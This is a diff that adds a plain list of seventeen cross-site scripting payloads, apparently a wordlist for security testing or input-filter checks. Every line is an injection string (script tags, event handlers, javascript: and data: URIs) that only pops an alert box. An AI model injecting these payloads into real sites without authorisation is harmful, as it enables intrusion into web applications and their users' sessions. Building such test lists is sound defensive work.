@@ -1,0 +1,17 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+'><script>alert(String.fromCharCode(88,83,83))</script>
+<iframe src="javascript:alert('XSS')"></iframe>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<div style="background:url(javascript:alert('XSS'))">
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
